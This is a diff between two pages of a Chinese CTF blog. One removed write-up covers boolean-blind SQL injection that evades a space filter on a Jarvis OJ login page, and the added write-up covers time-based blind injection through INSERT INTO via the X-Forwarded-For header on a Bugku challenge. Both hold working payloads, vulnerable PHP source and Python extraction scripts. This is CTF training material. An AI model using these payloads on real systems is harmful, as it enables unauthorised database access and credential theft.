@@ -22,7 +22,7 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1">
     <meta name="generator" content="Hugo 0.38.1 with theme Tranquilpeak 0.4.3-BETA">
-    <title>Writeup Simple Injection</title>
+    <title>Insert into</title>
     <meta name="author" content="CLtheorem">
     <meta name="keywords" content="">
 
@@ -30,17 +30,17 @@
     
 
     
-    <meta name="description" content="Jarvis OJ中web题——Simple Injection
+    <meta name="description" content="INSERT INTO函数基于时间的盲注
     ">
-    <meta property="og:description" content="Jarvis OJ中web题——Simple Injection
+    <meta property="og:description" content="INSERT INTO函数基于时间的盲注
     ">
     <meta property="og:type" content="blog">
-    <meta property="og:title" content="Writeup Simple Injection">
-    <meta property="og:url" content="/2018/09/writeup-simple-injection/">
+    <meta property="og:title" content="Insert into">
+    <meta property="og:url" content="/2018/11/insert-into/">
     <meta property="og:site_name" content="CLtheorem">
     <meta name="twitter:card" content="summary">
     <meta name="twitter:title" content="CLtheorem">
-    <meta name="twitter:description" content="Jarvis OJ中web题——Simple Injection
+    <meta name="twitter:description" content="INSERT INTO函数基于时间的盲注
     ">
     
     
@@ -197,15 +197,15 @@
             <div class="post-header main-content-wrap text-left">
   
     <h1 class="post-title" itemprop="headline">
-      Writeup Simple Injection
+      Insert into
     </h1>
   
   
   <div class="postShorten-meta post-meta">
     
-      <time itemprop="datePublished" datetime="2018-09-28T21:09:08&#43;08:00">
+      <time itemprop="datePublished" datetime="2018-11-18T17:00:04&#43;08:00">
         
-  九月 28, 2018
+  十一月 18, 2018
 
       </time>
     
@@ -224,132 +224,226 @@
           
           <div class="post-content markdown" itemprop="articleBody">
             <div class="main-content-wrap">	
-              <p>Jarvis OJ中web题——Simple Injection
+              <p>INSERT INTO函数基于时间的盲注
     </p>
 
-<p>题目链接：<a href="http://web.jarvisoj.com:32787/login.php">http://web.jarvisoj.com:32787/login.php</a></p>
+<p>0x00 原理</p>
 
-<p>0x00 分析</p>
-
-<pre><code>如题目所言，这是个SQL注入，且是个盲注。
-
-初步探测：username=admin  password=123456 提示密码错误；username=admin123  password=123456 提示用户名错误。
-
-发现用户名和密码出错有着不同的提示信息，可以猜测后台对用户名和密码是分步验证的，且已确定一个合法用户名admin。
-
-尝试构造：username=admin' and 1#  password=123456 提示用户名错误，调试后发现空格被过滤。
-
-可以用注释符/**/替换空格，再构造：username=admin'/**/and/**/1#  password=123456 提示密码错误，说明注入成功
-
-接下来就可以愉快的暴库爆表爆字段了。
+<pre><code>INSERT INTO函数语法:
+    INSERT INTO table_name(col_name1, col_name2,...) VALUES(value1, value2,...)
+也可在VALUES()中插入子语句，如下示例：
 </code></pre>
 
-<p>0x01 注入</p>
+<p><img src="/post/images/insertinto_1.jpg" alt="image1" /></p>
 
-<pre><code>以下payload省略password。
-
-payload1: username = admin'/**/and/**/length((select/**/group_concat(distinct/**/table_name)/**/from/**/information_schema.columns/**/where/**/table_schema=database()))&gt;1#
-使用二分法可以快速确定length(group_concat(distinct table_name))=5。
-
-知道长度后接下来就可以开始确定具体内容，手工比较麻烦，用python写个脚本：
+<pre><code>    即INSERT INTO users(username, password) VALUES( 'guest2',(select 'helloword'))中SELECT子语句先
+执行，其效果和 INSERT INTO users(username, password) VALUES( 'guest2','helloword') 一样。
+    基于此，当VALUES()中参数可控时，就可以实现注入。
 </code></pre>
 
-<p><br></p>
+<p>0x01 例题</p>
 
-<pre><code>import requests
+<pre><code>bugku中web题(ISNSERT INTO)：http://123.206.87.240:8002/web15/
+题目说明界面直接给出了源码，如下：
+</code></pre>
 
-if __name__ == '__main__':
-    url = 'http://web.jarvisoj.com:32787/login.php'
-    # username = &quot;admin'/**/and/**/length((select/**/group_concat(distinct/**/table_name)/**/from/**/information_schema.columns/**/where/**/table_schema=database()))=5#&quot;
-    for i in range(5):
-        for num in range(44, 123):
-            # 偷懒，直接遍历，不用二分法了。
-            username = &quot;admin'/**/and/**/ascii(substr((select/**/group_concat(distinct/**/table_name)/**/from/**/information_schema.columns/**/where/**/table_schema=database()),&quot;+str(i+1)+&quot;,1))=&quot;+str(num)+&quot;#&quot;
-            data = {
-                'username': username,
-                'password': '123'
+
+  
+    
+  
+  
+    
+  
+  
+  
+
+
+<figure class="highlight php language-php">
+  <figcaption>
+    
+      <span>source.php</span>
+    
+  </figcaption>
+  <table>
+    <tbody>
+      <tr>
+        <td class="gutter">
+          <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre>
+        </td>
+        <td class="code">
+          <pre class="code-highlight language-php"><code class="php">error_reporting(0);
+
+function getIp(){
+	$ip = &#39;&#39;;
+	if(isset($_SERVER[&#39;HTTP_X_FORWARDED_FOR&#39;])){
+		$ip = $_SERVER[&#39;HTTP_X_FORWARDED_FOR&#39;];
+	}
+	else{
+		$ip = $_SERVER[&#39;REMOTE_ADDR&#39;];
+	}
+	$ip_arr = explode(&#39;,&#39;, $ip);
+	return $ip_arr[0];
+}
+
+$host=&#34;localhost&#34;;
+$user=&#34;&#34;;
+$pass=&#34;&#34;;
+$db=&#34;&#34;;
+
+$connect = mysql_connect($host, $user, $pass) or die(&#34;Unable to connect&#34;);
+
+mysql_select_db($db) or die(&#34;Unable to select database&#34;);
+
+$ip = getIp();
+echo &#39;your ip is :&#39;.$ip;
+$sql=&#34;insert into client_ip (ip) values (&#39;$ip&#39;)&#34;;
+mysql_query($sql);</code></pre>
+        </td>
+      </tr>
+    </tbody>
+  </table>
+</figure>
+
+<pre><code>    通过控制请求头中的X-Forwarded-For参数我们可以将任意ip通过26行的INSERT INTO函数写入数据库中，另外源
+码第11、12行，起到了过滤逗号的作用，注入时需要避免使用逗号；最后就是题目没有sql语句执行情况的相关返回值
+所以选取基于时间的盲注。
+</code></pre>
+
+<p>
+  
+  
+  
+  
+
+
+<figure class="highlight  language-">
+  <figcaption>
+    
+  </figcaption>
+  <table>
+    <tbody>
+      <tr>
+        <td class="gutter">
+          <pre><span class="line">1</span><br></pre>
+        </td>
+        <td class="code">
+          <pre class="code-highlight language-"><code class="">payload1 = &#34;1&#39; and (case when length((select group_concat(distinct table_name) from information_schema.columns where table_schema=database()))=&#34; &#43; str(i) &#43; &#34; then sleep(3) end) and &#39;1&#34;</code></pre>
+        </td>
+      </tr>
+    </tbody>
+  </table>
+</figure></p>
+
+<pre><code>    不断改变payload1中 i 的值，当页面响应延迟时即可确定group_concat(distinct table_name)的长度。
+</code></pre>
+
+
+  
+  
+  
+  
+
+
+<figure class="highlight  language-">
+  <figcaption>
+    
+  </figcaption>
+  <table>
+    <tbody>
+      <tr>
+        <td class="gutter">
+          <pre><span class="line">1</span><br></pre>
+        </td>
+        <td class="code">
+          <pre class="code-highlight language-"><code class="">payload2 = &#34;1&#39; and (case when ascii(mid((select group_concat(distinct table_name) from information_schema.columns where table_schema=database()) from &#34; &#43; str(i) &#43; &#34; for 1))=&#34; &#43; str(asciinum) &#43; &#34; then sleep(3) end) and &#39;1&#34;</code></pre>
+        </td>
+      </tr>
+    </tbody>
+  </table>
+</figure>
+
+<pre><code>    这里使用mid(str from start for length)的方式来截取group_concat(distinct table_name)中的字符，避
+免了逗号。依次从第i个字符开始截取，与asciinum在[44,123]范围内的字符对比，当页面响应延迟时，即可确定当前
+位置字符。
+    按着这两步的思路依次获取表名和字段名以及最后的字段值即可。为节省时间，也可以跳过判断长度的步骤。
+    解题脚本如下：
+</code></pre>
+
+
+  
+    
+  
+  
+    
+  
+  
+  
+
+
+<figure class="highlight python language-python">
+  <figcaption>
+    
+      <span>script.py</span>
+    
+  </figcaption>
+  <table>
+    <tbody>
+      <tr>
+        <td class="gutter">
+          <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre>
+        </td>
+        <td class="code">
+          <pre class="code-highlight language-python"><code class="python">#!/usr/bin/env python
+
+if __name__ == &#39;__main__&#39;:
+    url = &#39;http://123.206.87.240:8002/web15/&#39;
+    length = 0
+
+    #get length
+    for i in range(1, 100):
+        # get the length of group_concat(distinct table_name) in db
+        # payload1 = &#34;1&#39; and (case when length((select group_concat(distinct table_name) from information_schema.columns where table_schema=database()))=&#34; &#43; str(i) &#43; &#34; then sleep(3) end) and &#39;1&#34;
+
+       	# get the length of group_concat(distinct column_name) in flag table
+        # payload3 = &#34;1&#39; and (case when length((select group_concat(distinct column_name) from information_schema.columns where table_name=&#39;flag&#39;))=&#34; &#43; str(i) &#43; &#34; then sleep(3) end) and &#39;1&#34;
+        	
+        # get the length of flag in flag table
+        payload5 = &#34;1&#39; and (case when length((select flag from flag))=&#34; &#43; str(i) &#43; &#34; then sleep(3) end) and &#39;1&#34;
+
+        headers = {
+            &#39;x-forwarded-for&#39;: payload5
+        }
+        try:
+            requests.get(url, headers=headers, timeout=2)
+        except requests.exceptions.ReadTimeout:
+            length = i
+            break
+
+    # get contents
+    for i in range(1, length&#43;1):  
+        for asciinum in range(44,123):
+        	# get the content of group_concat(distinct table_name) in db
+            # payload2 = &#34;1&#39; and (case when ascii(mid((select group_concat(distinct table_name) from information_schema.columns where table_schema=database()) from &#34; &#43; str(i) &#43; &#34; for 1))=&#34; &#43; str(asciinum) &#43; &#34; then sleep(3) end) and &#39;1&#34;
+            
+            # get the content of gropu_concat(distinct column_name) in flag table
+            # payload4 = &#34;1&#39; and (case when ascii(mid((select group_concat(distinct column_name) from information_schema.columns where table_name=&#39;flag&#39;) from &#34; &#43; str(i) &#43; &#34; for 1))=&#34;&#43; str(asciinum) &#43;&#34; then sleep(3) end) and &#39;1&#34;
+
+            # get the content of flag in flag table
+            payload6 = &#34;1&#39; and (case when ascii(mid((select flag from flag) from &#34; &#43; str(i) &#43; &#34; for 1))=&#34;&#43; str(asciinum) &#43;&#34; then sleep(3) end) and &#39;1&#34;
+
+            headers = {
+            &#39;x-forwarded-for&#39;: payload6
             }
-            html = requests.post(url, data=data)
-            if len(html.text)==1191:  # 密码错误时响应内容长度为1191
-                print(chr(num), end='')
-                break
-</code></pre>
-
-<p><br>
-<img src="/post/images/simpleInjection1.JPG" alt="image1" /></p>
-
-<pre><code>得到当前库中只有一张admin表。
-
-获取admin表中的字段名，与上面类似。
-payload3: username=admin'/**/and/**/length((select/**/group_concat(distinct/**/column_name)/**/from/**/information_schema.columns/**/where/**/table_schema=database()/**/and/**/table_name='admin'))&gt;1#
-使用二分法可以快速确定length(group_concat(distinct column_name))=20。
-上面的代码稍微改改，获取字段内容：
-</code></pre>
-
-<p><br>
-    <!-- tab python -->
-    import requests</p>
-
-<pre><code>if __name__ == '__main__':
-    url = 'http://web.jarvisoj.com:32787/login.php'
-    # username = &quot;admin'/**/and/**/length((select/**/group_concat(distinct/**/table_name)/**/from/**/information_schema.columns/**/where/**/table_schema=database()))=5#&quot;
-    for i in range(20):
-        for num in range(44, 123):
-            # 偷懒，直接遍历，不用二分法了。
-            # username = &quot;admin'/**/and/**/ascii(substr((select/**/group_concat(distinct/**/table_name)/**/from/**/information_schema.columns/**/where/**/table_schema=database()),&quot;+str(i+1)+&quot;,1))=&quot;+str(num)+&quot;#&quot;
-            # username = &quot;admin'/**/and/**/length((select/**/group_concat(distinct/**/column_name)/**/from/**/information_schema.columns/**/where/**/table_schema=database()/**/and/**/table_name='admin'))=20#&quot;
-            username = &quot;admin'/**/and/**/ascii(substr((select/**/group_concat(distinct/**/column_name)/**/from/**/information_schema.columns/**/where/**/table_schema=database()/**/and/**/table_name='admin'),&quot;+str(i+1)+&quot;,1))=&quot; + str(num) + &quot;#&quot;
-            data = {
-                'username': username,
-                'password': '123'
-            }
-            html = requests.post(url, data=data)
-            if len(html.text)==1191:  # 密码错误时响应内容长度为1191
-                print(chr(num), end='')
-                break
-&lt;!-- endtab --&gt;
-</code></pre>
-
-<p><br>
-<img src="/post/images/simpleInjection2.JPG" alt="image1" /></p>
-
-<pre><code>接着获取password字段，同样的方法确定len(password)=32，估计是个md5值，大同小异的代码：
-</code></pre>
-
-<p><br></p>
-
-<pre><code>import requests
-
-if __name__ == '__main__':
-    url = 'http://web.jarvisoj.com:32787/login.php'
-    # username = &quot;admin'/**/and/**/length((select/**/group_concat(distinct/**/table_name)/**/from/**/information_schema.columns/**/where/**/table_schema=database()))=5#&quot;
-    for i in range(32):
-        for num in range(44, 123):
-            # 偷懒，直接遍历，不用二分法了。
-            # username = &quot;admin'/**/and/**/ascii(substr((select/**/group_concat(distinct/**/table_name)/**/from/**/information_schema.columns/**/where/**/table_schema=database()),&quot;+str(i+1)+&quot;,1))=&quot;+str(num)+&quot;#&quot;
-            # username = &quot;admin'/**/and/**/length((select/**/group_concat(distinct/**/column_name)/**/from/**/information_schema.columns/**/where/**/table_schema=database()/**/and/**/table_name='admin'))=20#&quot;
-            # username = &quot;admin'/**/and/**/ascii(substr((select/**/group_concat(distinct/**/column_name)/**/from/**/information_schema.columns/**/where/**/table_schema=database()/**/and/**/table_name='admin'),&quot;+str(i+1)+&quot;,1))=&quot; + str(num) + &quot;#&quot;
-            # username = &quot;admin'/**/and/**/length((select/**/password/**/from/**/admin))=32#&quot;
-            username = &quot;admin'/**/and/**/ascii(substr((select/**/password/**/from/**/admin),&quot;+str(i+1)+&quot;,1))=&quot;+str(num)+&quot;#&quot;
-            data = {
-                'username': username,
-                'password': '123'
-            }
-            html = requests.post(url, data=data)
-            if len(html.text)==1191:  # 密码错误时响应内容长度为1191
-                print(chr(num), end='')
-                break
-</code></pre>
-
-<p><br></p>
-
-<pre><code>得到password = 334cfb59c9d74849801d5acdcfdaadc3，MD5解密可得到admin账户的登入密码 eTAloCrEP（那个
-username中也就一个admin用户），不过现在这个md5好像成为付费的了╮(╯▽╰)╭
-登陆后即可看到flag
-</code></pre>
-
-<p><br>
-<img src="/post/images/simpleInjection3.JPG" alt="image1" /></p>
+            try:
+                requests.get(url, headers=headers, timeout=2)
+            except requests.exceptions.ReadTimeout:
+                print(chr(asciinum), end=&#39;&#39;)
+                break</code></pre>
+        </td>
+      </tr>
+    </tbody>
+  </table>
+</figure>
               
             </div>
           </div>
@@ -374,7 +468,7 @@ username中也就一个admin用户），不过现在这个md5好像成为付费�
           
             <li class="post-action">
               
-                <a class="post-action-btn btn btn--default tooltip--top" href="/2018/10/pwntools/" data-tooltip="Pwntools">
+                <a class="post-action-btn btn btn--disabled">
               
                   <i class="fa fa-angle-left"></i>
                   <span class="hide-xs hide-sm text-small icon-ml">下一篇</span>
@@ -382,7 +476,7 @@ username中也就一个admin用户），不过现在这个md5好像成为付费�
             </li>
             <li class="post-action">
               
-                <a class="post-action-btn btn btn--default tooltip--top" href="/2018/09/%E7%94%A8photoshop%E8%A7%A3%E5%86%B3%E7%9A%84%E4%B8%A4%E9%81%93misc/" data-tooltip="用photoshop解决的两道misc">
+                <a class="post-action-btn btn btn--default tooltip--top" href="/2018/11/regular_expression/" data-tooltip="Regular_expression">
               
                   <span class="hide-xs hide-sm text-small icon-mr">上一篇</span>
                   <i class="fa fa-angle-right"></i>
@@ -442,7 +536,7 @@ username中也就一个admin用户），不过现在这个md5好像成为付费�
           
             <li class="post-action">
               
-                <a class="post-action-btn btn btn--default tooltip--top" href="/2018/10/pwntools/" data-tooltip="Pwntools">
+                <a class="post-action-btn btn btn--disabled">
               
                   <i class="fa fa-angle-left"></i>
                   <span class="hide-xs hide-sm text-small icon-ml">下一篇</span>
@@ -450,7 +544,7 @@ username中也就一个admin用户），不过现在这个md5好像成为付费�
             </li>
             <li class="post-action">
               
-                <a class="post-action-btn btn btn--default tooltip--top" href="/2018/09/%E7%94%A8photoshop%E8%A7%A3%E5%86%B3%E7%9A%84%E4%B8%A4%E9%81%93misc/" data-tooltip="用photoshop解决的两道misc">
+                <a class="post-action-btn btn btn--default tooltip--top" href="/2018/11/regular_expression/" data-tooltip="Regular_expression">
               
                   <span class="hide-xs hide-sm text-small icon-mr">上一篇</span>
                   <i class="fa fa-angle-right"></i>
@@ -770,9 +864,9 @@ $(document).ready(function() {
     
       <script>
         var disqus_config = function () {
-          this.page.url = '\/2018\/09\/writeup-simple-injection\/';
+          this.page.url = '\/2018\/11\/insert-into\/';
           
-            this.page.identifier = '\/2018\/09\/writeup-simple-injection\/'
+            this.page.identifier = '\/2018\/11\/insert-into\/'
           
         };
         (function() {
